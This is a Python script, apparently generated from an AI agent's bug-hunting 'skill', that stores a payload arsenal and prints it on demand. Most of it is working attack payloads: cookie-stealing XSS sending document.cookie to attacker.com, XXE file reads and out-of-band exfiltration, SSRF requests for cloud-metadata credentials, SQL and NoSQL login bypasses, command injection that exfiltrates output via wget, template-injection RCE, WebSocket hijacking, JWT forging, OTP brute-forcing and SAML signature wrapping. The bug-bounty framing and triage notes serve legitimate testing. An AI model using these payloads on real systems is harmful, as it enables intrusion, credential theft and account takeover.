#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: claude-bughunter/security-arsenal

Skill: SECURITY ARSENAL
Desc : Security payloads, bypass tables, wordlists, gf pattern names, always-rejected bug list, and conditionally-valid-with-chain table. Use when you need specific payloads for XSS/SSRF/SQLi/XXE/NoSQLi/command injection/SSTI/IDOR/path-traversal/HTTP smuggling/WebSocket/MFA bypass, or bypass techniques. Submittability and the always-rejected / what-NOT-to-submit decision are owned by triage-validation.

Run:  python claude-bughunter-security-arsenal.py --help
      python claude-bughunter-security-arsenal.py --list
      python claude-bughunter-security-arsenal.py --dump <section>
"""
import sys, json, argparse

NAME = 'claude-bughunter/security-arsenal'
TITLE = 'SECURITY ARSENAL'
DESCRIPTION = 'Security payloads, bypass tables, wordlists, gf pattern names, always-rejected bug list, and conditionally-valid-with-chain table. Use when you need specific payloads for XSS/SSRF/SQLi/XXE/NoSQLi/command injection/SSTI/IDOR/path-traversal/HTTP smuggling/WebSocket/MFA bypass, or bypass techniques. Submittability and the always-rejected / what-NOT-to-submit decision are owned by triage-validation.'

PAYLOADS = {
    'main': ["name: security-arsenal", "description: Security payloads, bypass tables, wordlists, gf pattern names, always-rejected bug list, and conditionally-valid-with-chain table. Use when you need specific payloads for XSS/SSRF/SQLi/XXE/NoSQLi/command injection/SSTI/IDOR/path-traversal/HTTP smuggling/WebSocket/MFA bypass, or bypass techniques. Submittability and the always-rejected / what-NOT-to-submit decision are owned by triage-validation."],
    'security-arsenal': ["Payloads, bypass tables, wordlists, and submission rules."],
    'xss-payloads': [],
    'basic-probes': ["```javascript", "<script>alert(document.domain)</script>", "<img src=x onerror=alert(document.domain)>", "<svg onload=alert(document.domain)>", "\"><script>alert(1)</script>", "'><img src=x onerror=alert(1)>", "javascript:alert(document.domain)"],
    'cookie-theft-proof-of-impact': ["```javascript", "<script>document.location='https://attacker.com/c?c='+document.cookie</script>", "<img src=x onerror=\"fetch('https://attacker.com?c='+document.cookie)\">", "<script>fetch('https://attacker.com?c='+btoa(document.cookie))</script>"],
    'csp-bypass-techniques': ["```javascript", "// If unsafe-inline blocked \u2014 use fetch/XHR", "<img src=x onerror=\"fetch('https://attacker.com?d='+btoa(document.cookie))\">", "// If script-src nonce present \u2014 find nonce reflection", "<script nonce=\"NONCE_FROM_PAGE\">alert(1)</script>", "// Angular template injection (bypasses many CSPs)", "{{constructor.constructor('alert(1)')()}}", "// React dangerouslySetInnerHTML reflection", "// Vue v-html binding", "// mXSS (mutation-based XSS)", "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">", "// Polyglot (works in HTML/JS/CSS context)", "'\">><marquee><img src=x onerror=confirm(1)></marquee>\"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->\"></script><script>alert(1)</script>"],
    'dom-xss-sources-and-sinks': ["```javascript", "// Sources (user-controlled input)", "location.hash", "location.search", "location.href", "document.referrer", "window.name", "document.URL", "// Sinks (dangerous)", "innerHTML = SOURCE", "outerHTML = SOURCE", "document.write(SOURCE)", "eval(SOURCE)", "setTimeout(SOURCE, ...)   // string form", "setInterval(SOURCE, ...)", "new Function(SOURCE)", "element.src = SOURCE      // javascript: URI", "element.href = SOURCE", "location.href = SOURCE"],
    'ssrf-payloads': [],
    'cloud-metadata': ["```bash"],
    'aws': ["http://169.254.169.254/latest/meta-data/", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME", "http://169.254.169.254/latest/user-data/", "http://169.254.169.254/latest/dynamic/instance-identity/document"],
    'gcp': ["http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"],
    'header-metadata-flavor-google': [],
    'azure-imds': ["http://169.254.169.254/metadata/instance?api-version=2021-02-01"],
    'header-metadata-true': [],
    'internal-service-fingerprinting': ["```bash", "http://localhost:6379      # Redis (unauthenticated, RESP protocol)", "http://localhost:9200      # Elasticsearch (/_cat/indices)", "http://localhost:27017     # MongoDB (binary \u2014 check for connection refused vs timeout)", "http://localhost:8080      # Admin panel", "http://localhost:2375      # Docker API \u2014 GET /containers/json", "http://localhost:10.96.0.1:443  # Kubernetes API server"],
    'ssrf-ip-bypass-payloads': ["```bash"],
    'all-of-these-map-to-127-0-0-1': ["http://2130706433          # decimal", "http://0177.0.0.1          # octal", "http://0x7f.0x0.0x0.0x1   # hex", "http://127.1               # short form", "http://[::1]               # IPv6 loopback", "http://[::ffff:127.0.0.1]  # IPv4-mapped IPv6", "http://[::ffff:0x7f000001] # mixed hex IPv6"],
    'dns-rebinding-a-external-then-resolves-to-internal-after-allowlist-check': [],
    'redirect-chain-vercel-pattern': [],
    'if-filter-only-checks-initial-url-but-follows-redirects': ["http://allowed-domain.com/redirect?to=http://169.254.169.254/"],
    'sql-injection-payloads': [],
    'detection': ["```sql", "' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "' UNION SELECT NULL--", "'; WAITFOR DELAY '0:0:5'--   -- MSSQL time-based", "'; SELECT SLEEP(5)--          -- MySQL time-based", "' OR SLEEP(5)--"],
    'union-based-determine-column-count': ["```sql", "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT 'a',NULL,NULL--"],
    'blind-sqli-time-based-confirmation': ["```sql"],
    'mysql': ["' AND SLEEP(5)--"],
    'postgresql': ["' AND pg_sleep(5)--"],
    'mssql': ["'; WAITFOR DELAY '0:0:5'--"],
    'oracle': ["' AND 1=dbms_pipe.receive_message('a',5)--"],
    'waf-bypass': ["```sql", "/*!50000 SELECT*/ * FROM users     -- MySQL inline comment", "SE/**/LECT * FROM users             -- comment injection", "SeLeCt * FrOm uSeRs                -- case variation", "%27 OR %271%27=%271                 -- URL encoding", "\u02bc OR \u02bc1\u02bc=\u02bc1                       -- Unicode apostrophe"],
    'xxe-payloads': [],
    'classic-file-read': ["```xml", "<?xml version=\"1.0\"?>", "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>", "<foo>&xxe;</foo>"],
    'blind-oob-via-http-dns-confirmation': ["```xml", "<?xml version=\"1.0\"?>", "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.burpcollaborator.net/xxe\">]>", "<foo>&xxe;</foo>"],
    'blind-oob-via-dns-data-exfil': ["```xml", "<?xml version=\"1.0\"?>", "<!DOCTYPE foo [", "<!ENTITY % data SYSTEM \"file:///etc/passwd\">", "<!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'http://attacker.com/?%data;'>\">", "%param1;", "<foo>&exfil;</foo>"],
    'xxe-via-docx-svg-pdf-upload': ["- SVG: `<image href=\"file:///etc/passwd\" />`", "- DOCX: malicious XML in `word/document.xml` with external entity"],
    'path-traversal-payloads': ["```bash", "../../../etc/passwd", "....//....//....//etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "..%252f..%252f..%252fetc%252fpasswd   # double URL encoding", "/etc/passwd%00.jpg                     # null byte truncation", "....\\/....\\/etc/passwd                 # mix of separators"],
    'idor-auth-bypass-payloads': [],
    'horizontal-privilege-escalation': ["```bash"],
    'change-numeric-id': ["GET /api/user/123/profile \u2192 GET /api/user/124/profile"],
    'change-uuid-find-victim-uuid-via-other-endpoints': ["GET /api/profile/a1b2c3d4-... \u2192 GET /api/profile/e5f6g7h8-..."],
    'http-method-swap': ["PUT /api/user/123 (protected) \u2192 DELETE /api/user/123 (not protected)"],
    'old-api-version': ["GET /v2/users/123 (protected) \u2192 GET /v1/users/123 (not protected)"],
    'add-parameter': ["GET /api/orders \u2192 GET /api/orders?user_id=456"],
    'vertical-privilege-escalation': ["```bash"],
    'parameter-pollution': ["POST /api/user/update", "{\"role\": \"admin\"}", "{\"isAdmin\": true}", "{\"admin\": 1}"],
    'hidden-fields': ["<input type=\"hidden\" name=\"admin\" value=\"true\">"],
    'change-in-burp-before-sending': [],
    'graphql-introspection-find-admin-mutations': ["{\"query\": \"{ __schema { types { name fields { name } } } }\"}"],
    'authentication-bypass-payloads': [],
    'jwt-attacks': ["```bash"],
    'none-algorithm': [],
    'decode-jwt-change-alg-to-none-remove-signature': ["import base64, json", "header = base64.b64encode(json.dumps({\"alg\":\"none\",\"typ\":\"JWT\"}).encode()).decode().rstrip('=')", "payload = base64.b64encode(json.dumps({\"sub\":\"1\",\"role\":\"admin\"}).encode()).decode().rstrip('=')", "token = f\"{header}.{payload}.\""],
    'secret-bruteforce': ["hashcat -a 0 -m 16500 jwt.txt ~/wordlists/rockyou.txt"],
    'oauth-attacks': ["```bash"],
    'missing-pkce-test': ["GET /oauth2/auth?response_type=code&client_id=X&redirect_uri=Y&scope=Z"],
    'no-code-challenge-check-if-302-not-error-pkce-not-enforced': [],
    'state-parameter-check': ["GET /oauth2/auth?response_type=code&client_id=X&redirect_uri=Y&scope=Z"],
    'missing-static-state-parameter-csrf-on-oauth-account-linkage-attack': [],
    'nosql-injection-payloads-mongodb': [],
    'operator-injection-json-body': ["```json", "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}", "{\"username\": {\"$regex\": \".*\"}, \"password\": {\"$regex\": \".*\"}}", "{\"username\": \"admin\", \"password\": {\"$gt\": \"\"}}", "{\"$where\": \"this.username == 'admin'\"}", "{\"username\": {\"$in\": [\"admin\", \"root\", \"administrator\"]}}"],
    'get-parameter-injection': ["```bash"],
    'url-parameter-injection': ["/login?username[$ne]=null&password[$ne]=null", "/login?username[$regex]=.*&password[$regex]=.*", "/login?username=admin&password[$gt]="],
    'mongodb-operator-reference': [],
    'ne-not-equal-bypass-value-null-any-value-matches': [],
    'gt-greater-than-bypass-any-string': [],
    'regex-regex-match-bypass-anything': [],
    'where-js-expression-rce-potential-on-older-mongodb': [],
    'auth-bypass-one-liners': ["```bash", "curl -s -X POST https://target.com/api/login \\", "-H \"Content-Type: application/json\" \\", "-d '{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}'"],
    'url-encoded-for-get-forms': [],
    'username-5b-24ne-5d-null-password-5b-24ne-5d-null': [],
    'command-injection-payloads': [],
    'basic-detection': ["```bash", "` id `", "$(id)", "&& id", "; sleep 5", "$(sleep 5)", "`sleep 5`"],
    'blind-oob-out-of-band-confirmation': ["```bash", "; curl https://attacker.burpcollaborator.net", "; nslookup attacker.burpcollaborator.net", "$(nslookup attacker.burpcollaborator.net)", "`ping -c 1 attacker.burpcollaborator.net`", "; wget https://attacker.com/$(id|base64)"],
    'bypass-techniques': ["```bash"],
    'bypass-space-filter': [";{cat,/etc/passwd}", ";cat${IFS}/etc/passwd", ";cat$IFS/etc/passwd", ";IFS=,;cat,/etc/passwd"],
    'bypass-keyword-filter-cat-id-blocked': [],
    'obfuscate-with-quotes': [";c'a't /etc/passwd", ";c\"a\"t /etc/passwd", ";$(printf '\\x63\\x61\\x74') /etc/passwd"],
    'bypass-via-env': [";$BASH -c 'id'", ";${IFS}id"],
    'windows-specific': ["& dir", "& ping -n 1 attacker.com"],
    'context-specific-filename-injection': ["```bash"],
    'file-upload-filenames': ["test.jpg; id", "test$(id).jpg", "test`id`.jpg", "../test.jpg", "../../../../../../etc/passwd"],
    'ssti-detection-payloads-all-engines': [],
    'universal-probe-send-all-observe-which-evaluate': ["{{7*7}}        \u2192 49 = Jinja2 (Python) or Twig (PHP)", "${7*7}         \u2192 49 = Freemarker (Java) or Spring EL", "<%= 7*7 %>     \u2192 49 = ERB (Ruby) or EJS (Node.js)", "*{7*7}         \u2192 49 = Spring Thymeleaf", "{{7*'7'}}      \u2192 7777777 = Jinja2 (not Twig \u2014 Twig gives 49)", "${\"freemarker.template.utility.Execute\"?new()(\"id\")}  \u2192 Freemarker RCE"],
    'rce-payloads-by-engine': ["**Jinja2 (Python/Flask/Django):**", "```python", "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}", "**Twig (PHP/Symfony):**", "```php", "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}", "{{['id']|filter('system')}}", "**Freemarker (Java):**", "${\"freemarker.template.utility.Execute\"?new()(\"id\")}", "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ ex(\"id\") }", "**ERB (Ruby on Rails):**", "```ruby", "<%= `id` %>", "<%= system(\"id\") %>", "<%= IO.popen('id').read %>", "**Spring Thymeleaf:**", "```java", "${T(java.lang.Runtime).getRuntime().exec('id')}", "__${T(java.lang.Runtime).getRuntime().exec(\"id\")}__::.x", "**EJS (Node.js):**", "```javascript", "<%= process.mainModule.require('child_process').execSync('id') %>"],
    'where-to-test': ["Name/bio/username fields, email subject templates, invoice/PDF generators,", "URL path parameters reflected in page, error messages, search query reflections,", "HTTP headers that appear in rendered responses, notification templates"],
    'http-smuggling-payloads': [],
    'cl-te-content-length-front-end-transfer-encoding-back-end': ["```http", "POST / HTTP/1.1", "Host: target.com", "Content-Length: 13", "Transfer-Encoding: chunked", "SMUGGLED"],
    'te-cl-transfer-encoding-front-end-content-length-back-end': ["```http", "POST / HTTP/1.1", "Host: target.com", "Transfer-Encoding: chunked", "Content-Length: 3", "SMUGGLED"],
    'te-te-both-support-transfer-encoding-obfuscate-to-disable-one': ["```http"],
    'obfuscate-the-te-header-so-one-layer-ignores-it': ["Transfer-Encoding: xchunked", "Transfer-Encoding: chunked", "Transfer-Encoding: chunked", "Transfer-Encoding: x", "Transfer-Encoding:[tab]chunked", "[space]Transfer-Encoding: chunked", "X: X[\\n]Transfer-Encoding: chunked", "Transfer-Encoding", ": chunked"],
    'h2-cl-http-2-front-end-with-content-length-injection': [],
    'in-burp-repeater-switch-to-http-2': [],
    'add-content-length-header-manually-not-auto-set-by-http-2': [],
    'front-end-ignores-cl-http-2-uses-content-length-pseudo-header': [],
    'back-end-uses-cl-desync': [],
    'detection-burp': ["1. Install HTTP Request Smuggler extension", "2. Right-click request \u2192 Extensions \u2192 HTTP Request Smuggler \u2192 Smuggle probe", "3. All four probe types automatically sent", "4. ~10-second timeout on CL.TE probe = back-end waiting = CONFIRMED"],
    'impact-chain': ["Basic desync          \u2192 Capture victim's next request \u2192 Read their auth token", "+ Admin user traffic  \u2192 Access admin as victim", "+ Cache poisoning     \u2192 Stored XSS at scale for all users"],
    'websocket-payloads': [],
    'idor-auth-bypass': ["```javascript", "// Test: subscribe to other user's channel", "{\"action\": \"subscribe\", \"channel\": \"user_VICTIM_ID_HERE\"}", "{\"action\": \"get_history\", \"userId\": \"VICTIM_UUID\"}", "{\"action\": \"getProfile\", \"id\": 2}", "{\"action\": \"admin.listUsers\"}", "{\"action\": \"admin.getToken\", \"userId\": \"1\"}"],
    'cross-site-websocket-hijacking-cswsh': ["```html", "<!-- Host on attacker site. If no Origin validation, steals victim's WS data. -->", "<script>", "var ws = new WebSocket('wss://target.com/ws');", "// Browser automatically sends victim's cookies", "ws.onopen = () => ws.send(JSON.stringify({action:\"getProfile\"}));", "ws.onmessage = (e) => fetch('https://attacker.com/?d='+encodeURIComponent(e.data));", "</script>"],
    'test-origin-validation': ["```bash"],
    'should-reject-non-target-origins-if-it-doesn-t-cswsh-vulnerability': ["wscat -c \"wss://target.com/ws\" -H \"Origin: https://evil.com\"", "wscat -c \"wss://target.com/ws\" -H \"Origin: null\"", "wscat -c \"wss://target.com/ws\" -H \"Origin: https://target.com.evil.com\""],
    'injection-via-ws-messages': ["```javascript", "// XSS in chat/notification system", "{\"message\": \"<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>\"}", "// SQLi", "{\"action\": \"search\", \"query\": \"' OR 1=1--\"}", "// SSRF (if server fetches URLs from messages)", "{\"action\": \"preview\", \"url\": \"http://169.254.169.254/latest/meta-data/\"}"],
    'mfa-2fa-bypass-payloads': [],
    'pattern-1-otp-brute-force-no-rate-limit': ["```bash"],
    'try-all-6-digit-otps': ["ffuf -u \"https://target.com/api/verify-otp\" \\", "-X POST \\", "-H \"Content-Type: application/json\" \\", "-H \"Cookie: session=YOUR_SESSION\" \\", "-d '{\"otp\":\"FUZZ\"}' \\", "-w <(seq -w 000000 999999) \\", "-fc 400,429 \\"],
    'rate-limit-bypass-rotate-session-tokens-between-requests': [],
    'or-use-graphql-batching-to-send-100-attempts-per-request': [],
    'pattern-2-otp-reuse-token-not-invalidated': ["1. Request OTP \u2192 receive \"123456\"", "2. Submit OTP correctly \u2192 authenticated", "3. Log out", "4. Log in again", "5. Submit same OTP \"123456\" (expired? still works?)", "6. Try OTP from previous session at new login"],
    'pattern-3-response-manipulation': ["Step 1: Enter wrong OTP \u2192 intercept response in Burp", "Step 2: Change: {\"success\": false, \"message\": \"Invalid OTP\"} \u2192 {\"success\": true}", "Step 3: Forward modified response \u2192 sometimes app trusts it and proceeds", "Also try: change status code 401 \u2192 200, or change redirect from /failed to /dashboard"],
    'pattern-4-code-predictability': ["```python", "import requests, time"],
    'some-implementations-use-timestamp-based-otps': ["for t_offset in range(-30, 31):  # Test \u00b130 seconds", "totp_value = generate_totp(secret, time.time() + t_offset)", "r = requests.post(\"https://target.com/api/mfa\", json={\"otp\": totp_value})", "if r.status_code == 200:", "print(f\"VALID at offset {t_offset}s: {totp_value}\")", "break"],
    'pattern-5-backup-codes-not-rate-limited': ["```bash"],
    'backup-codes-are-typically-8-character-alphanumeric-smaller-space-than-6-digit-totp': [],
    'try-brute-force-on-api-verify-backup-code-if-no-rate-limit': [],
    'pattern-6-skip-mfa-step-workflow-bypass': ["```bash"],
    'after-entering-username-password-you-get-a-session-cookie': [],
    'test-skip-the-mfa-verify-step-entirely-go-directly-to-dashboard': [],
    'if-cookie-grants-access-before-mfa-auth-flow-bypass': [],
    'also-complete-mfa-in-one-session-reuse-cookie-in-another-browser': [],
    'checks-whether-mfa-completion-is-tied-to-the-specific-session': [],
    'pattern-7-race-on-mfa-verification': ["```python", "import asyncio, aiohttp"],
    'race-2-mfa-verifications-simultaneously': [],
    'if-both-succeed-parallel-session-ato': ["async def verify(session, otp):", "async with session.post(\"https://target.com/api/mfa/verify\",", "json={\"otp\": otp}) as r:", "return await r.json()", "async def race():", "async with aiohttp.ClientSession(cookies={\"session\": \"YOUR_SESSION\"}) as s:", "results = await asyncio.gather(verify(s, \"123456\"), verify(s, \"123456\"))", "print(results)", "asyncio.run(race())"],
    'saml-attacks': [],
    'attack-1-xml-signature-wrapping-xsw': ["```xml", "<!-- Original valid assertion: -->", "<saml:Assertion ID=\"legit\">", "<NameID>user@company.com</NameID>", "<ds:Signature>VALID_SIGNATURE_OVER_legit</ds:Signature>", "</saml:Assertion>", "<!-- XSW: Inject malicious assertion before/after the signed one. -->", "<!-- Server validates signature on #legit but processes #evil instead. -->", "<saml:Response>", "<saml:Assertion ID=\"evil\">", "<NameID>admin@company.com</NameID>     <!-- Attacker-controlled -->", "</saml:Assertion>", "<saml:Assertion ID=\"legit\">              <!-- Original stays valid -->", "<NameID>user@company.com</NameID>", "<ds:Signature>VALID_SIGNATURE</ds:Signature>", "</saml:Assertion>", "</saml:Response>"],
    'attack-2-comment-injection-in-nameid': ["```xml", "<!-- Original: user@company.com -->", "<!-- Injected:  -->", "<NameID>admin<!---->@company.com</NameID>", "<!-- XML parsers strip comments: admin@company.com -->", "<!-- SAML validator sees \"user@company.com\" (before comment) -->", "<!-- Application uses \"admin@company.com\" (after comment stripped) -->"],
    'attack-3-signature-stripping': ["1. Capture SAMLResponse (base64 decode from browser)", "2. Remove or modify the <Signature> element entirely", "3. Change NameID to admin@company.com", "4. Re-encode and submit", "5. If server doesn't validate signature presence = admin login"],
    'attack-4-xxe-in-saml-assertion': ["```xml", "<?xml version=\"1.0\" encoding=\"UTF-8\"?>", "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>", "<saml:Response>", "<saml:Assertion>", "<NameID>&xxe;</NameID>", "</saml:Assertion>", "</saml:Response>"],
    'tools': ["```bash"],
    'samlraider-burp-extension-most-automated-xsw-testing': [],
    'install-from-bapp-store-intercept-samlresponse-right-click-saml-raider': [],
    'manual-decode-modify-re-encode': ["echo \"BASE64_SAML_RESPONSE\" | base64 -d | xmllint --format - > saml.xml"],
    'edit-saml-xml': ["cat saml.xml | base64 -w0  # Re-encode"],
    'gf-pattern-names-tomnomnom-gf': ["```bash"],
    'install-https-github-com-tomnomnom-gf': [],
    'usage-cat-urls-txt-gf-pattern': ["gf xss          # XSS parameters", "gf ssrf         # SSRF parameters", "gf idor         # IDOR parameters", "gf sqli         # SQL injection parameters", "gf redirect     # Open redirect parameters", "gf lfi          # Local file inclusion", "gf rce          # Remote code execution parameters", "gf ssti         # Template injection parameters", "gf debug_logic  # Debug/logic parameters", "gf secrets      # Secret/token patterns", "gf upload-fields # File upload parameters", "gf cors         # CORS-related parameters"],
    'always-rejected-never-submit': ["Submitting these destroys your validity ratio. N/A hurts. Don't.", "Missing CSP / HSTS / X-Frame-Options / other security headers", "Missing SPF / DKIM / DMARC", "GraphQL introspection alone (no auth bypass, no IDOR)", "Banner / version disclosure without a working CVE exploit", "Clickjacking on non-sensitive pages (no sensitive action in PoC)", "Tabnabbing", "CSV injection (no actual code execution shown)", "CORS wildcard (*) without credential exfil PoC", "Logout CSRF", "Self-XSS (only exploits own account)", "Open redirect alone (no ATO chain, no OAuth code theft)", "OAuth client_secret in mobile app (disclosed, expected)", "SSRF with DNS callback only (no internal service access)", "Host header injection alone (no password reset poisoning PoC)", "Rate limit on non-critical forms (login page Cloudflare, search, contact)", "Session not invalidated on logout", "Concurrent sessions allowed", "Internal IP address in error message", "Mixed content (HTTP resources on HTTPS page)", "SSL weak cipher suites", "Missing HttpOnly / Secure cookie flags alone", "Broken external links", "Pre-account takeover (usually \u2014 requires very specific conditions)", "Autocomplete on password fields"],
    'conditionally-valid-requires-chain': ["These are valid ONLY when combined with a chain that proves real impact:", "**Rule:** Build the chain first, confirm it works end-to-end, THEN report. Never report A and say \"could chain with B\" \u2014 prove it."],
    'wordlists-installed-in-wordlists': ["common.txt         # Common directories and files", "params.txt         # Parameter names (id, user_id, file, etc.)", "api-endpoints.txt  # API endpoint paths (/api/v1/users, etc.)", "dirs.txt           # Directory names", "sensitive.txt      # Sensitive paths (.env, config.json, backup, etc.)"],
    'built-in-paths-worth-fuzzing': ["```bash"],
    'sensitive-files': ["/.env", "/.git/config", "/config.json", "/credentials.json", "/backup.sql", "/dump.sql", "/.DS_Store", "/robots.txt", "/sitemap.xml", "/.well-known/security.txt"],
    'admin-panels': ["/admin", "/admin/login", "/administrator", "/wp-admin", "/manager", "/console", "/dashboard", "/panel"],
    'api-discovery': ["/api/v1", "/api/v2", "/graphql", "/graphiql", "/swagger", "/swagger-ui.html", "/api-docs", "/openapi.json"],
    'related-skills-chains': ["- **`hunt-xss`** / **`hunt-ssrf`** / **`hunt-sqli`** / **`hunt-ssti`** / **`hunt-idor`** \u2014 When a hunter is actively testing a parameter and needs payloads. Workflow primitive: this skill is the payload library those hunt-* skills reach for; the hunt-* skill identifies the sink, this skill provides the syntax.", "- **`triage-validation`** \u2014 When deciding if a finding is reportable at all. Workflow primitive: the \"Always Rejected\" and \"Conditionally Valid \u2014 Requires Chain\" tables in both skills must agree; `triage-validation` runs the 7-Question Gate, this skill provides the chain-required mapping used by Q7.", "- **`web2-recon`** \u2014 When the URL set has been classified by `gf` patterns. Workflow primitive: `gf xss/ssrf/sqli` outputs from recon \u2192 look up the corresponding payload section here; `gf` pattern names index directly into this skill's payload sections.", "- **`evidence-hygiene`** \u2014 When a payload produces output worth screenshotting. Workflow primitive: after a payload demonstrates impact (cookie theft, data exfil), hand off to `evidence-hygiene` for redaction before the screenshot becomes evidence.", "- **`bb-methodology`** \u2014 When Phase 3 (Discovery) routes by input type. Workflow primitive: Phase 3's decision flow (\"ID param \u2192 IDOR checklist\", \"URL input \u2192 SSRF checklist\") names which section of this arsenal to load."],
    'operator-notes-claude-bughunter': [],
    'payload-freshness-what-s-gone-stale-by-2026': ["The classic CL.TE / TE.CL HTTP smuggling payloads no longer work against Nginx \u2265 1.21, Caddy 2.x, Envoy \u2265 1.20 (verified in Phase 2H). They DO still work against HAProxy \u2264 2.4, older F5 BIG-IP, Citrix ADC, AWS ALB-specific configs, and Apache Traffic Server. Fingerprint the front-end first \u2014 `curl -sI` \u2192 `Server:` header + `Via:` chain + TLS JA3 \u2014 before burning hours on payloads that the parser already rejects at the front door.", "Same story for XXE classic \u2014 Python lxml \u2265 5.x silently drops SYSTEM entities by default (Phase 2G finding). The payloads remain valid against: Java SAX, PHP DOMDocument with LIBXML_NOENT, .NET XmlDocument with XmlResolver still wired, older lxml (< 5.0), Ruby Nokogiri with DTDLOAD, and a long tail of embedded XML processors (SOAP libraries, SAML implementations, Office document parsers). The payload library still ships these \u2014 the operator decision is whether the target's parser is in the still-vulnerable set.", "Other stale-by-default-but-not-everywhere payloads as of 2026: `javascript:` URLs in `<a href>` (Chrome blocks unless explicit user gesture; works in embedded WebViews, Electron, older Edge); `data:text/html` for top-level navigation (modern browsers strip in nav contexts); CRLF injection in `Location:` (most reverse proxies normalize). Always test in the actual target environment, not in a generic browser."],
    'waf-evaluation-order-matters': ["When multiple bypass payloads exist for the same WAF, the order to try is:", "1. **Encoding tricks** \u2014 case variation (`SeLeCt`), URL-encode once, URL-encode twice, Unicode escape (`<`), HTML-entity (`&#x3c;`), UTF-8 overlong sequences.", "2. **Parser quirks** \u2014 XML namespace, JSON `\\u` escapes mid-keyword, `Content-Type: application/json` vs `application/x-www-form-urlencoded` parser-confusion, multipart boundary tricks.", "3. **Protocol-level** \u2014 HTTP/2 vs HTTP/1.1 (some WAFs only inspect one), Host header injection, `X-Original-URL`, `X-Forwarded-*` smuggling.", "4. **WAF rule-specific bypasses** \u2014 Cloudflare, AWS WAF, Akamai, Imperva, F5 ASM each have known signature gaps; load the vendor-specific payload subsection.", "Most engagements end at step 2 \u2014 modern WAFs trip on the parser-quirk class because the WAF and the origin app disagree on what's a \"valid\" request."],
    'oob-or-it-didn-t-happen-gate-applies-everywhere': ["Every blind primitive (blind SQLi, blind XSS, blind SSRF, blind RCE, blind XXE) needs OOB confirmation. Without it, you can't tell the bug from a parser-error log. Phase 2D's hardened lab proved the gate kills FPs that look identical to real bugs at the surface \u2014 error messages with `you have an error in your SQL syntax` text in a 500 page can be parser logs from a different request entirely, hit a Burp Collaborator domain (or interactsh) and confirm callback before filing.", "OOB callback infrastructure ranking by 2026: (1) Burp Collaborator (Pro license; cleanest), (2) interactsh-client (open source; comparable), (3) DNSLog.cn (free but logged by third party \u2014 never use for paid engagements), (4) self-hosted catch-all DNS + HTTP listener (most reliable for long-running engagements)."],
    'marker-discipline': ["Generic words appear naturally in target content. A search for `javascript` hitting \"JavaScript Tutorial\" is not reflection \u2014 it's keyword overlap. Use unique random strings:", "m=$(head -c 12 /dev/urandom | base64 | tr -d '+/=' | head -c 12)"],
    'now-m-is-like-k7gxq2pnrm1z-search-for-this-in-the-response': ["curl \"https://target/search?q=${m}\" | grep -c \"$m\"", "If the marker appears in the response, you have reflection. If it appears unescaped in HTML context, you have XSS potential. If it appears in a Location header, redirect. If it appears in a SQL error, injection. The marker is the single source of truth \u2014 generic keywords lie."],
    'statistical-sampling-for-noisy-oracles': ["Single-trial timing differentials are noise. Require n\u226510 interleaved trials, Welch's t-statistic > 3, or equivalent confidence-interval separation. Phase 2D verified this against a deliberately-noisy timing oracle: single trial showed 129ms delta (which would have been filed); n=10 showed mean 78ms vs 191ms with t=5.26 (real, well-supported).", "Skeleton for timing-side-channel validation:", "```python", "import statistics", "def welch_t(a, b):", "ma, mb = statistics.mean(a), statistics.mean(b)", "va, vb = statistics.variance(a), statistics.variance(b)", "return (ma - mb) / ((va/len(a) + vb/len(b)) ** 0.5)"],
    'interleave-control-test-trials-n-10-each-t-3-signal': ["Same rule applies to blind boolean oracles where the diff is response-length or status-code under jitter \u2014 sample, don't assume."],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()